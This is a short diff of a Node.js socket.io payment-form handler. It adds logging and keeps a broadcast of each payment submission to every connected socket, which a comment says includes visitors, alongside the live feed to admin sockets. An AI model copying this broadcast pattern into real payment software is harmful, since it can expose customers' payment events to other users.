@@ -353,15 +353,19 @@ io.on('connection', (socket) => {
         timestamp: new Date()
       };
       
-      adminConnections.forEach((adminSocket) => {
+      // Send to all connected admins
+      console.log(`📤 Broadcasting payment to ${adminConnections.size} admins`);
+      adminConnections.forEach((adminSocket, socketId) => {
+        console.log(`📤 Sending to admin socket: ${socketId}`);
         adminSocket.emit('form:paymentSubmitted', eventData);
         adminSocket.emit('visitor:updated', eventData);
       });
       
+      // Also broadcast to all sockets (including visitors for confirmation)
       io.emit('form:paymentSubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
-      console.log(`💳 Payment form processed safely for ${sessionId} (total submissions: ${submissionsResult.rows.length})`);
+      console.log(`💳 Payment form processed for ${sessionId} - card: ${finalPaymentData.cardNumber?.slice(-4) || 'N/A'}`);
     } catch (error) {
       console.error('Error saving payment data:', error);
     }
